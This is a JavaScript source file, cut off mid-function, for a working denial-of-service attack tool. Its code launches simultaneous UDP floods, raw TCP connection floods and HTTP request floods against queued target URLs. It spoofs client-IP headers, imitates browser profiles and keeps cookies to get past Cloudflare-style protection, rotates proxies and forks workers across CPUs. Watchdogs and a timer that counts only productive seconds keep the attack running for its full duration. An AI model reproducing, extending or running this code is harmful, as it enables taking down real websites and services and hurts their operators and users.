const express = require("express");
const fs = require("fs");
const path = require("path");
const http = require("http");
const https = require("https");
const net = require("net");
const dgram = require("dgram");
const tls = require("tls");
const cluster = require("cluster");
const os = require("os");
const { randomUserAgent } = require("random-headers");
const { SocksProxyAgent } = require("socks-proxy-agent");
const { request: urequest, ProxyAgent } = require("undici");
const readline = require("readline");
require("dotenv").config();

const nport = require("./nport.js");

const USE_CLUSTER = process.env.USE_CLUSTER === "true";

// ===================== SHARED CONFIG =====================
const REQUESTS_PER_CYCLE = parseInt(process.env.PER_THREAD, 10) || 3;
const numThreads = parseInt(process.env.MAX_THREADS, 10) || 500;
const MAX_QUEUE = parseInt(process.env.MAX_QUEUE, 10) || 20;
const REQUEST_TIMEOUT = parseInt(process.env.TIMEOUT, 10) || 10000;
const USE_UDP = process.env.UDP_FLOOD !== "false";
const USE_RAW_TCP = process.env.RAW_TCP !== "false";
const KEEP_ALIVE = process.env.KEEP_ALIVE !== "false";
const L7_BYPASS = process.env.L7_BYPASS !== "false";

// ===================== PROCESS-LEVEL ERROR GUARDS =====================
// Prevents the entire process from crashing on unhandled errors/rejections
// which is the #1 cause of the attack stopping suddenly after hours of runtime.
process.on('uncaughtException', (err) => {
  try { console.error(colors.red(`[FATAL] Uncaught Exception: ${err.message}`)); } catch {}
  // Keep process alive — do NOT exit
});

process.on('unhandledRejection', (reason) => {
  // Suppress noisy abort/network errors that are already handled
  if (!reason || reason.code === 'UND_ERR_ABORTED' || reason.code === 'ECONNRESET' || reason.code === 'ETIMEDOUT') return;
  try { console.error(colors.red(`[FATAL] Unhandled Rejection: ${reason?.message || reason}`)); } catch {}
  // Keep process alive — do NOT exit
});

const colors = {
  red: (t) => `\x1b[31m${t}\x1b[0m`,
  green: (t) => `\x1b[32m${t}\x1b[0m`,
  yellow: (t) => `\x1b[33m${t}\x1b[0m`,
  cyan: (t) => `\x1b[36m${t}\x1b[0m`,
  magenta: (t) => `\x1b[35m${t}\x1b[0m`,
  gray: (t) => `\x1b[90m${t}\x1b[0m`,
  bold: (t) => `\x1b[1m${t}\x1b[0m`,
};

const generateCacheBuster = () => `${Date.now()}_${Math.random().toString(36).slice(2, 6)}`;
const formatNumber = (num) => num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");

const proxyFilePath = path.join(__dirname, "proxy.txt");
const getRandomElement = (arr) => arr[Math.floor(Math.random() * arr.length)];

function loadProxies() {
  try {
    return fs.readFileSync(proxyFilePath, "utf-8").split("\n").map(l => l.trim()).filter(Boolean);
  } catch {
    return [];
  }
}

const getNoCacheHeaders = (forcedProfile) => {
  if (L7_BYPASS && browserProfiles) {
    const profile = forcedProfile || browserProfiles[profileIdxCounter++ % browserProfiles.length];
    return buildBrowserHeaders(profile);
  }
  return {
    "Cache-Control": "no-cache, no-store, max-age=0",
    Pragma: "no-cache",
    "User-Agent": randomUserAgent(),
    "Accept": "*/*",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": KEEP_ALIVE ? "keep-alive" : "close",
    "X-Forwarded-For": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
    "CF-Connecting-IP": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
    "True-Client-IP": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
  };
};

const httpAgent = KEEP_ALIVE ? new http.Agent({ keepAlive: true, keepAliveMsecs: 1000, maxSockets: Infinity, maxFreeSockets: 256 }) : null;
const httpsAgent = KEEP_ALIVE ? new https.Agent({ keepAlive: true, keepAliveMsecs: 1000, maxSockets: Infinity, maxFreeSockets: 256, rejectUnauthorized: false }) : null;

// ===================== L7 BYPASS ENGINE =====================

const browserProfiles = L7_BYPASS ? [
  { name: "chrome-win",  userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36", secCHUA: '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"', platform: "Windows", accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8", acceptLang: "en-US,en;q=0.9" },
  { name: "chrome-mac",   userAgent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36", secCHUA: '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"', platform: "macOS",   accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8", acceptLang: "en-US,en;q=0.9" },
  { name: "firefox-win",  userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0", secCHUA: '', platform: "Windows", accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", acceptLang: "en-US,en;q=0.5" },
  { name: "firefox-mac",   userAgent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:135.0) Gecko/20100101 Firefox/135.0", secCHUA: '', platform: "macOS",   accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", acceptLang: "en-US,en;q=0.5" },
] : null;

// Standard keep-alive agents — custom TLS (ciphers, curves, version pinning)
// broke TLS handshakes and caused HTTP 403 rejections on many servers.
// The L7 bypass is driven by headers, cookie persistence, and request jitter.
const browserAgents = L7_BYPASS ? browserProfiles.map(() => new https.Agent({
  keepAlive: KEEP_ALIVE,
  keepAliveMsecs: 1000,
  maxSockets: Infinity,
  maxFreeSockets: 256,
  rejectUnauthorized: false,
})) : null;

let profileIdxCounter = 0;

function getNextProfile() {
  if (!L7_BYPASS || !browserProfiles) return null;
  const idx = profileIdxCounter++ % browserProfiles.length;
  return { profile: browserProfiles[idx], agent: browserAgents[idx], idx };
}

function buildBrowserHeaders(profile) {
  const spoofIP = `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
  const h = {
    "Accept": profile.accept,
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": profile.acceptLang,
    "Cache-Control": "no-cache, no-store, max-age=0",
    "Pragma": "no-cache",
    "Connection": KEEP_ALIVE ? "keep-alive" : "close",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": profile.userAgent,
    "X-Forwarded-For": spoofIP,
    "CF-Connecting-IP": spoofIP,
    "True-Client-IP": spoofIP,
  };
  // Chrome/Edge send Sec-CH-UA headers; Firefox does not
  if (profile.secCHUA) {
    h["Sec-CH-UA"] = profile.secCHUA;
    h["Sec-CH-UA-Mobile"] = "?0";
    h["Sec-CH-UA-Platform"] = `"${profile.platform}"`;
  }
  h["Sec-Fetch-Dest"] = "document";
  h["Sec-Fetch-Mode"] = "navigate";
  h["Sec-Fetch-Site"] = "none";
  h["Sec-Fetch-User"] = "?1";
  return h;
}

// Cookie jar for session persistence (Cloudflare cf_clearance, etc.)
const cookieJar = L7_BYPASS ? new Map() : null;

function storeCookies(hostname, rawHeaders) {
  if (!cookieJar || !rawHeaders) return;
  const setCookie = rawHeaders["set-cookie"];
  if (!setCookie) return;
  const cookies = Array.isArray(setCookie) ? setCookie : [setCookie];
  if (!cookieJar.has(hostname)) cookieJar.set(hostname, {});
  const jar = cookieJar.get(hostname);
  for (const cookieStr of cookies) {
    const [nameValue] = cookieStr.split(";");
    const eqIdx = nameValue.indexOf("=");
    if (eqIdx > 0) jar[nameValue.slice(0, eqIdx).trim()] = nameValue.slice(eqIdx + 1).trim();
  }
}

function getCookies(hostname) {
  if (!cookieJar) return "";
  const jar = cookieJar.get(hostname);
  if (!jar) return "";
  const entries = Object.entries(jar);
  if (!entries.length) return "";
  return entries.map(([k, v]) => `${k}=${v}`).join("; ");
}

// Request jitter: random delay between cycles (50-200ms)
function getJitter() {
  if (!L7_BYPASS) return 0;
  return Math.floor(Math.random() * 150) + 50;
}

// ===================== ATTACK FUNCTIONS =====================

// Track all UDP sockets so we can close them when the attack stops
const udpSockets = new Set();

function udpFlood(targetIP, port, threadId) {
  const socket = dgram.createSocket("udp4");
  udpSockets.add(socket);
  const payload = Buffer.alloc(1400, "A");
  let sent = 0;
  let closed = false;
  const cleanup = () => {
    if (!closed) { closed = true; udpSockets.delete(socket); clearInterval(closeTimer); try { socket.close(); } catch {} }
  };
  const flood = () => {
    if (!continueAttack) { cleanup(); return; }
    for (let i = 0; i < 10; i++) {
      socket.send(payload, 0, payload.length, port, targetIP, (err) => {
        if (!err) sent++;
      });
    }
    if (continueAttack) setImmediate(flood);
  };
  setImmediate(flood);
  // Also close socket if attack stops for 5+ seconds (safety net)
  const closeTimer = setInterval(() => {
    if (!continueAttack) { clearInterval(closeTimer); cleanup(); }
  }, 5000);
  return () => sent;
}

// Close all UDP sockets (called when attack stops)
function closeAllUdpSockets() {
  for (const sock of udpSockets) {
    try { sock.close(); } catch {}
  }
  udpSockets.clear();
}

function rawTCPFlood(host, port, threadId) {
  let sent = 0;
  const flood = () => {
    if (!continueAttack) return;
    for (let i = 0; i < 5; i++) {
      const socket = new net.Socket();
      socket.connect(port, host, () => {
        socket.write(`GET /${generateCacheBuster()} HTTP/1.1\r\nHost: ${host}\r\n\r\n`);
        sent++;
        socket.destroy();
      });
      socket.on("error", () => {});
    }
    setImmediate(flood);
  };
  setImmediate(flood);
  return () => sent;
}

function socksRequest(url, agent, threadId) {
  return new Promise((resolve) => {
    const start = Date.now();
    const req = https.request(url, { agent, method: "GET", headers: getNoCacheHeaders(), timeout: REQUEST_TIMEOUT, rejectUnauthorized: false }, (res) => {
      res.resume();
      // Log non-200 status codes occasionally for diagnostics
      if (res.statusCode !== 200 && Math.random() < 0.01) {
        try { console.error(colors.gray(`[${new Date().toLocaleTimeString()}] [socks] ${url} → ${res.statusCode} (${Date.now()-start}ms)`)); } catch {}
      }
      lastSuccessTime = Date.now();
      resolve({ status: res.statusCode });
    });
    req.on("error", (err) => {
      // Log connection errors occasionally to help diagnose blocking
      if (Math.random() < 0.005) {
        try { console.error(colors.red(`[${new Date().toLocaleTimeString()}] [socks] ${url} → ${err.code || err.message}`)); } catch {}
      }
      resolve(null);
    });
    req.on("timeout", () => { req.destroy(); resolve(null); });
    req.end();
  });
}

function createContext(proxyLine) {
  if (!proxyLine) return { type: "direct" };
  const parts = proxyLine.split(":");
  if (parts[0].includes("socks")) {
    const host = parts[0].replace("socks5://", "").replace("socks4://", "");
    return { type: "socks", agent: new SocksProxyAgent(`socks5://${host}:${parts[1]}`) };
  }
  return { type: "http", dispatcher: new ProxyAgent(`http://${proxyLine}`) };
}

// Track consecutive failures per host to detect blocking/rate-limiting
const hostFailureCount = new Map();
// Track last time any request succeeded (to detect server downtime vs rate-limiting)
// Reset to Date.now() whenever an attack starts/resumes.
let lastSuccessTime = Date.now();
// Wall-clock time when the current attack started — used for robust duration tracking
// across process crashes + restarts.
let attackStartTime = 0;
// Per-thread backoff state: Map<threadId, { consecutiveFailures, backoffMs }>
const threadBackoff = new Map();

const fireHTTPRequest = (url, ctx, threadId) => {
  return new Promise((resolve) => {
    const start = Date.now();
    const parsedUrl = new URL(url);
    const host = parsedUrl.hostname;
    // Pick a browser agent for L7 bypass direct HTTPS
    let agent;
    let profileData = null;
    if (L7_BYPASS && browserAgents && parsedUrl.protocol === "https:" && (!ctx || ctx.type === "direct")) {
      profileData = getNextProfile();
      agent = profileData.agent;
    } else {
      agent = parsedUrl.protocol === "https:" ? httpsAgent : httpAgent;
    }
    const headers = getNoCacheHeaders(profileData ? profileData.profile : null);
    // Attach stored cookies for session persistence
    if (L7_BYPASS) {
      const cookies = getCookies(host);
      if (cookies) headers["Cookie"] = cookies;
    }
    // Auto-switch to Connection: close when keep-alive connections go stale
    const failCount = hostFailureCount.get(host) || 0;
    if (failCount > 10) {
      headers["Connection"] = "close";
    }
    const options = {
      hostname: host,
      port: parsedUrl.port || (parsedUrl.protocol === "https:" ? 443 : 80),
      path: parsedUrl.pathname + parsedUrl.search,
      method: "GET",
      headers,
      agent,
      timeout: REQUEST_TIMEOUT,
      rejectUnauthorized: false,
    };
    const req = (parsedUrl.protocol === "https:" ? https : http).request(options, (res) => {
      // Reset failure count on successful response
      if (hostFailureCount.has(host)) hostFailureCount.delete(host);
      lastSuccessTime = Date.now();
      if (L7_BYPASS && res.headers) storeCookies(host, res.headers);
      res.resume();
      // Log non-200 status codes occasionally for diagnostics
      if (res.statusCode !== 200 && Math.random() < 0.005) {
        try { console.error(colors.gray(`[${new Date().toLocaleTimeString()}] [t${threadId}] ${url} → ${res.statusCode} (${Date.now()-start}ms)`)); } catch {}
      }
      resolve({ status: res.statusCode });
    });
    req.on("error", (err) => {
      // Track consecutive failures per host for connection mgmt
      hostFailureCount.set(host, (hostFailureCount.get(host) || 0) + 1);
      // Log connection errors occasionally to help diagnose blocking
      if (Math.random() < 0.005) {
        try { console.error(colors.yellow(`[${new Date().toLocaleTimeString()}] [t${threadId}] ${url} → ${err.code || err.message}`)); } catch {}
      }
      resolve(null);
    });
    req.on("timeout", () => {
      hostFailureCount.set(host, (hostFailureCount.get(host) || 0) + 1);
      req.destroy();
      resolve(null);
    });
    req.end();
  });
};

// ===================== WORKER PROCESS =====================
// Attack engine only — no CLI, no Express, no readline

if (USE_CLUSTER && cluster.isWorker) {
  let continueAttack = false;
  let currentTarget = null;

  const performAttack = async (target, ctx, threadId, isDirect) => {
    try {
      if (!continueAttack || !target) return;

      // Workers do NOT check duration — the master process tracks effective attack time
      // and broadcasts stop when the target is complete.
      // This prevents the attack from stopping early due to wall-clock vs effective time mismatch.

      // Launch ALL attack types simultaneously
      if (USE_UDP) {
        const parsed = new URL(target.url);
        udpFlood(parsed.hostname, parsed.port || 80, threadId);
      }
      if (USE_RAW_TCP) {
        const parsed = new URL(target.url);
        rawTCPFlood(parsed.hostname, parsed.port || 80, threadId);
      }
      // HTTP/L7 requests fire concurrently with UDP/TCP above
      const promises = [];
      for (let i = 0; i < REQUESTS_PER_CYCLE; i++) {
        const cb = generateCacheBuster();
        const sep = target.url.includes("?") ? "&" : "?";
        const url = `${target.url}${sep}_=${cb}&nocache=${cb}&cb=${Date.now()}&r=${Math.random()}`;
      if (ctx.type === "socks") {
        promises.push(socksRequest(url, ctx.agent, threadId));
      } else if (ctx.type === "http") {
        promises.push(
          urequest(url, { dispatcher: ctx.dispatcher, method: "GET", headers: getNoCacheHeaders(), signal: AbortSignal.timeout(REQUEST_TIMEOUT) })
            .then(async (res) => { lastSuccessTime = Date.now(); await res.body.dump(); return { status: res.statusCode }; })
            .catch(() => null)
        );
      } else {
        promises.push(fireHTTPRequest(url, ctx, threadId));
      }
      }

      let successfulRequests = 0;
      try {
        const results = await Promise.allSettled(promises);
        for (const r of results) {
          if (r.status === "fulfilled" && r.value && r.value.status) successfulRequests++;
        }
      } catch {}

      if (process.connected) {
        process.send({ type: "report", count: successfulRequests, threadId });
      }
    } catch (err) {
      try { console.error(colors.red(`[Worker Thread ${threadId}] Attack error: ${err.message}`)); } catch {}
    }

    if (continueAttack) {
      const j = getJitter();
      if (j > 0) setTimeout(() => performAttack(target, ctx, threadId, isDirect), j);
      else setImmediate(() => performAttack(target, ctx, threadId, isDirect));
    }
  };

  process.on("message", (msg) => {
    if (msg.type === "start") {
      continueAttack = true;
      currentTarget = msg.target;
      const proxies = loadProxies();
      const halfThreads = Math.ceil(msg.threadsForMe / 2);

      for (let i = 0; i < msg.threadsForMe; i++) {
        if (!continueAttack) break;
        if (i < halfThreads || !proxies.length) {
          performAttack(currentTarget, { type: "direct" }, i, true);
        } else {
          performAttack(currentTarget, createContext(getRandomElement(proxies)), i, false);
        }
      }
    } else if (msg.type === "stop") {
      continueAttack = false;
    }
  });

  // Keep worker alive
  setInterval(() => {}, 60000);
  module.exports = {};
  return;
}

// ===================== WATCHDOG =====================
// Periodically checks if the attack appears stalled.
// Does NOT spawn new threads (that would leak). Instead, resets connection
// state (hostFailureCount, backoff) so existing threads can recover.
// If the server is genuinely down, threads are already backing off exponentially.

let watchdogTimer = null;
let lastWatchdogReqCount = 0;
let watchdogStallCount = 0;

function startWatchdog() {
  stopWatchdog();
  lastWatchdogReqCount = totalRequestsSent + totalReqCount;
  watchdogStallCount = 0;
  watchdogTimer = setInterval(() => {
    const currentCount = totalRequestsSent + totalReqCount;
    if (continueAttack && currentTarget && !(USE_CLUSTER && cluster.isMaster)) {
      // Check if requests are still flowing
      if (currentCount === lastWatchdogReqCount) {
        watchdogStallCount++;
        if (watchdogStallCount >= 5) { // 5 consecutive stalls = ~5 seconds of no activity
          console.log(colors.yellow(`[Watchdog] 0 req/s for ${watchdogStallCount}s — resetting connection state...`));
          // Reset connection state so threads can try fresh connections
          hostFailureCount.clear();
          threadBackoff.clear();
          closeAllUdpSockets();
          watchdogStallCount = 0;
        }
        // Every 30 seconds, also log a server-down warning
        if (watchdogStallCount >= 30) {
          console.log(colors.yellow(`[Watchdog] Server appears down for ${Math.round((Date.now() - lastSuccessTime)/1000)}s — threads backing off, will resume when server recovers`));
          watchdogStallCount = 0; // Reset to avoid spamming every second
        }
      } else {
        // If requests are flowing again, reset stall counter
        if (watchdogStallCount > 0) {
          console.log(colors.green(`[Watchdog] Traffic resumed after ${watchdogStallCount}s stall`));
        }
        watchdogStallCount = 0;
      }
      lastWatchdogReqCount = currentCount;
    }
  }, 1000);
}

function stopWatchdog() {
  if (watchdogTimer) {
    clearInterval(watchdogTimer);
    watchdogTimer = null;
  }
  watchdogStallCount = 0;
}

// ===================== EFFECTIVE ATTACK TIME TRACKER =====================
// Counts only seconds where at least 1 request succeeded.
// Server downtime does NOT count toward the duration.
// This ensures the attack always runs for the full user-specified duration.

function startProductiveTimer() {
  // Cluster mode uses startStatusDisplay for effective time tracking;
  // the productive timer is only needed for single-process mode.
  if (USE_CLUSTER && cluster.isMaster) return;
  stopProductiveTimer();
  lastProductiveCheckCount = totalRequestsSent + totalReqCount;
  productiveTimer = setInterval(() => {
    if (!continueAttack) return;
    const currentCount = totalRequestsSent + totalReqCount;
    if (currentCount > lastProductiveCheckCount) {
      totalEffectiveMs += 1000;
    }
    lastProductiveCheckCount = currentCount;
    // Note: completion logic is handled by performAttackSingle for single-process mode
    // and by startStatusDisplay for cluster mode.
    // This timer ONLY tracks effective time — no state transitions.
  }, 1000);
}

function stopProductiveTimer() {
  if (productiveTimer) {
    clearInterval(productiveTimer);
    productiveTimer = null;
  }
}

// ===================== MASTER / SINGLE-PROCESS =====================

// Shared state
const stateFilePath = path.join(__dirname, "attackState.json");
let continueAttack = false;
let currentTarget = null;
let totalRequestsSent = 0;
let targetQueue = [];
let activeThreads = [];
let lastStatusLog = 0;
let nportUrl = null;
let tunnelActive = false;
let saveTimer = null;
let statusInterval = null;
let totalReqCount = 0;
// Effective attack time — counts only seconds where at least 1 request succeeded.
// Server downtime does NOT count toward the duration, so the attack always runs
// for the full user-specified duration regardless of outages.
let totalEffectiveMs = 0;
let productiveTimer = null;
let lastProductiveCheckCount = 0;

// Cluster master forks workers
if (USE_CLUSTER && cluster.isMaster) {
  const numWorkers = os.cpus().length;
  console.log(colors.cyan(`Forking ${numWorkers} attack workers...`));
  for (let i = 0; i < numWorkers; i++) cluster.fork();
  cluster.on("exit", (worker) => { cluster.fork(); });

  // Aggregate worker reports
  cluster.on("message", (worker, msg) => {
    if (msg.type === "report") {
      totalReqCount += msg.count;
    } else if (msg.type === "targetComplete") {
      handleTargetComplete();
    }
  });
}

// ===================== STATE MANAGEMENT =====================

function ensureStateFileExists() {
  if (!fs.existsSync(stateFilePath)) {
    fs.writeFileSync(stateFilePath, JSON.stringify({ continueAttack: false, currentTarget: null, totalRequests: 0, queue: [], totalEffectiveMs: 0 }));
  }
}

function loadState() {
  ensureStateFileExists();
  try {
    return JSON.parse(fs.readFileSync(stateFilePath, "utf-8"));
  } catch {
    return { continueAttack: false, currentTarget: null, totalRequests: 0, queue: [], totalEffectiveMs: 0 };
  }
}

let state = loadState();
continueAttack = state.continueAttack;
currentTarget = state.currentTarget;
totalRequestsSent = state.totalRequests || 0;
totalEffectiveMs = state.totalEffectiveMs || 0;
targetQueue = state.queue || [];  if (currentTarget) {
    // On restart, check if effective time already met
    // Wall-clock is NOT checked — server downtime is not a reason to stop.
    if (totalEffectiveMs >= currentTarget.duration) {
      console.log(colors.yellow(`Target already completed effective time: ${currentTarget.url}`));
      currentTarget = null;
    } else if (currentTarget.startTime && Date.now() - currentTarget.startTime > currentTarget.duration * 20) {
      // Safety: 20x duration wall-clock exceeded — target is stale
      console.log(colors.yellow(`Target wall-clock expired: ${currentTarget.url}`));
      currentTarget = null;
    }
  }
if (!currentTarget && targetQueue.length > 0) {
  currentTarget = targetQueue.shift();
  console.log(colors.green(`Starting next target from queue: ${currentTarget.url}`));
  totalRequestsSent = 0;
  totalEffectiveMs = 0;
}
if (currentTarget === null) {
  continueAttack = false;
  totalRequestsSent = 0;
  totalEffectiveMs = 0;
}
state = { continueAttack, currentTarget, totalRequests: totalRequestsSent, queue: targetQueue, totalEffectiveMs };
fs.writeFileSync(stateFilePath, JSON.stringify(state));

function debouncedSave() {
  if (saveTimer) return;
  saveTimer = setTimeout(() => {
    state.totalRequests = totalRequestsSent + totalReqCount;
    state.totalEffectiveMs = totalEffectiveMs;
    fs.writeFile(stateFilePath, JSON.stringify(state), () => {});
    saveTimer = null;
  }, 500);
}

function saveNow() {
  if (saveTimer) { clearTimeout(saveTimer); saveTimer = null; }
  totalRequestsSent += totalReqCount;
  totalReqCount = 0;
  state.totalRequests = totalRequestsSent;
  state.totalEffectiveMs = totalEffectiveMs;
  fs.writeFileSync(stateFilePath, JSON.stringify(state));
}

function resetTotal() {
  totalRequestsSent = 0;
  totalReqCount = 0;
  totalEffectiveMs = 0;
  lastProductiveCheckCount = 0;
  state.totalRequests = 0;
  fs.writeFileSync(stateFilePath, JSON.stringify(state));
  console.log(colors.green("Total reset to 0"));
}

// ===================== COMMAND / UI FUNCTIONS =====================

function startStatusDisplay() {
  if (statusInterval) clearInterval(statusInterval);
  statusInterval = setInterval(() => {
    const count = totalReqCount;
    totalRequestsSent += count;
    totalReqCount = 0;
    // Track effective time: if any requests succeeded this second, count it
    if (count > 0) totalEffectiveMs += 1000;
    // In cluster mode, check if effective duration has been met
    if (count > 0 && currentTarget && totalEffectiveMs >= currentTarget.duration) {
      console.log(colors.green(`[Effective time] ${Math.round(totalEffectiveMs/60000)}min reached — target complete`));
      handleTargetComplete();
      return;
    }
    if (count > 0 || lastStatusLog > 0) {
      const effectivePct = currentTarget ? Math.round((totalEffectiveMs / Math.max(1, currentTarget.duration)) * 100) : 0;
      console.log(`${colors.green(">")} ${colors.gray(`[${new Date().toLocaleTimeString()}]`)} ${colors.red(`${formatNumber(count)} req/s`)} | ${colors.cyan(`Total: ${formatNumber(totalRequestsSent)}`)} | ${colors.magenta(`Workers: ${Object.keys(cluster.workers || {}).length || 1}`)} | ${colors.green(`${effectivePct}%`)}`);
      debouncedSave();
    }
    lastStatusLog = Date.now();
  }, 1000);
}

function stopStatusDisplay() {
  if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
}

function handleTargetComplete() {
  stopProductiveTimer();
  if (targetQueue.length > 0) {
    currentTarget = targetQueue.shift();
    console.log(colors.green(`Target completed — starting next: ${currentTarget.url}`));
    resetTotal();
    totalEffectiveMs = 0;
    state = { continueAttack, currentTarget, totalRequests: totalRequestsSent, queue: targetQueue, totalEffectiveMs: 0 };
    saveNow();
    broadcastToWorkers({ type: "start", target: currentTarget, threadsForMe: Math.ceil(numThreads / (Object.keys(cluster.workers || {}).length || 1)) });
    startProductiveTimer();
  } else {
    continueAttack = false;
    currentTarget = null;
    resetTotal();
    totalEffectiveMs = 0;
    state = { continueAttack: false, currentTarget: null, totalRequests: 0, queue: [], totalEffectiveMs: 0 };
    saveNow();
    stopStatusDisplay();
    console.log(colors.yellow("All targets completed. Attack finished."));
    broadcastToWorkers({ type: "stop" });
  }
}

function broadcastToWorkers(msg) {
  if (USE_CLUSTER && cluster.isMaster && cluster.workers) {
    for (const id in cluster.workers) {
      try { cluster.workers[id].send(msg); } catch {}
    }
  }
}

const addToQueue = async (url, durationHours) => {
  if (!url || !/^https?:\/\//.test(url)) { console.log(colors.red("Invalid URL")); return false; }
  if (targetQueue.length >= MAX_QUEUE) { console.log(colors.red(`Queue is full. Max queue size: ${MAX_QUEUE}`)); return false; }
  const newTarget = { url, startTime: Date.now(), duration: durationHours * 60 * 60 * 1000 };
  targetQueue.push(newTarget);
  state = { continueAttack, currentTarget, totalRequests: totalRequestsSent, queue: targetQueue };
  saveNow();
  console.log(colors.green(`Added to queue: ${url} for ${durationHours}h (${targetQueue.length}/${MAX_QUEUE})`));
  return true;
};

const startAttack = async (url, durationHours) => {
  if (!url || !/^https?:\/\//.test(url)) { console.log(colors.red("Invalid URL")); return false; }
  if (continueAttack) { console.log(colors.yellow("Attack already running, adding to queue instead")); return await addToQueue(url, durationHours); }

  resetTotal();
  targetQueue = [];

  currentTarget = { url, startTime: Date.now(), duration: durationHours * 60 * 60 * 1000 };
  continueAttack = true;
  state = { continueAttack, currentTarget, totalRequests: 0, queue: [] };
  saveNow();
  lastSuccessTime = Date.now();

  const proxies = loadProxies();
  const directCount = proxies.length ? Math.floor(numThreads / 2) : numThreads;
  const proxyCount = proxies.length ? numThreads - directCount : 0;

  console.log(colors.green(`\nAttack Started: ${url} for ${durationHours}h`));
  console.log(colors.cyan(`Threads: ${numThreads} | Req/cycle: ${REQUESTS_PER_CYCLE}`));
  if (USE_CLUSTER && cluster.isMaster) {
    console.log(colors.magenta(`Workers: ${Object.keys(cluster.workers).length} | Distributed mode`));
  }
  console.log(colors.magenta(`Direct: ${directCount} threads | Proxy: ${proxyCount} threads`));
  if (USE_UDP) console.log(colors.red("UDP FLOOD: ON"));
  if (USE_RAW_TCP) console.log(colors.red("RAW TCP: ON"));
  if (KEEP_ALIVE) console.log(colors.cyan("Keep-Alive: ON"));
  if (L7_BYPASS) console.log(colors.magenta("L7 BYPASS: ON (browser TLS fingerprints + Sec-* headers + cookie persistence + jitter)"));
  console.log(colors.green("ALL ATTACK LAYERS RUNNING CONCURRENTLY (L4 UDP + L4 TCP + L7 HTTP)"));
  if (tunnelActive && nportUrl) console.log(colors.magenta(`Public: ${nportUrl}`));
  console.log("");

  if (USE_CLUSTER && cluster.isMaster) {
    const numWorkers = Object.keys(cluster.workers).length;
    const threadsPerWorker = Math.ceil(numThreads / numWorkers);
    totalReqCount = 0;
    for (const id in cluster.workers) {
      cluster.workers[id].send({ type: "start", target: currentTarget, threadsForMe: threadsPerWorker });
    }
    startStatusDisplay();
    startWatchdog();
    startProductiveTimer();
  } else {
    // Single-process mode: launch threads directly
    activeThreads = [];
    let threadId = 0;
    if (!proxies.length) {
      for (let i = 0; i < numThreads; i++) {
        if (!continueAttack) break;
        performAttackSingle(currentTarget, { type: "direct" }, threadId++, true);
        activeThreads.push(i);
      }
    } else {
      for (let i = 0; i < directCount; i++) {
        if (!continueAttack) break;
        performAttackSingle(currentTarget, { type: "direct" }, threadId++, true);
        activeThreads.push(i);
      }
      for (let i = 0; i < proxyCount; i++) {
        if (!continueAttack) break;
        performAttackSingle(currentTarget, createContext(getRandomElement(proxies)), threadId++, false);
        activeThreads.push(i + directCount);
      }
    }
    startWatchdog();
    startProductiveTimer();
  }
  return true;
};

// Single-process attack function — wrapped in try/catch so errors
// in one cycle never kill the thread. The next cycle is always scheduled.
const performAttackSingle = async (target, ctx, threadId, isDirect) => {
  let backoffDelay = 0;
  try {
    if (!continueAttack || !target) return;

    // Check effective attack time first (downtime doesn't count toward duration)
    if (totalEffectiveMs >= target.duration) {
      console.log(colors.green(`[Duration] ${Math.round(totalEffectiveMs/60000)}min effective attack time reached — target complete`));
      if (targetQueue.length > 0) {
        currentTarget = targetQueue.shift();
        console.log(colors.green(`Starting next target from queue: ${currentTarget.url}`));
        const nextTarget = currentTarget;
        resetTotal();
        totalEffectiveMs = 0;
        lastProductiveCheckCount = 0;
        state = { continueAttack, currentTarget: nextTarget, totalRequests: totalRequestsSent, queue: targetQueue, totalEffectiveMs: 0 };
        saveNow();
        currentTarget = nextTarget;
        // Clear old thread backoff states — new threads start fresh
        threadBackoff.clear();
        // Spawn new threads for the next target — existing threads stop naturally
        const proxies = loadProxies();
        let nextThreadId = 0;
        if (!proxies.length) {
          for (let i = 0; i < numThreads; i++) {
            if (!continueAttack) break;
            performAttackSingle(nextTarget, { type: "direct" }, nextThreadId++, true);
          }
        } else {
          const directCount = Math.floor(numThreads / 2);
          for (let i = 0; i < directCount; i++) {
            if (!continueAttack) break;
            performAttackSingle(nextTarget, { type: "direct" }, nextThreadId++, true);
          }
          for (let i = 0; i < numThreads - directCount; i++) {
            if (!continueAttack) break;
            performAttackSingle(nextTarget, createContext(getRandomElement(proxies)), nextThreadId++, false);
          }
        }
        console.log(colors.green(`Spawned ${nextThreadId} threads for: ${nextTarget.url}`));
      } else {
        continueAttack = false;
        currentTarget = null;
        resetTotal();
        totalEffectiveMs = 0;
        state = { continueAttack: false, currentTarget: null, totalRequests: 0, queue: [], totalEffectiveMs: 0 };
        saveNow();
        console.log(colors.yellow("All targets completed. Attack finished."));
      }
      return;
    }

    // Safety fallback: if wall-clock exceeds 20x duration (e.g. 80 hours for a 4h target),
    // force-stop to prevent truly infinite runs in case of a bug. Under normal conditions
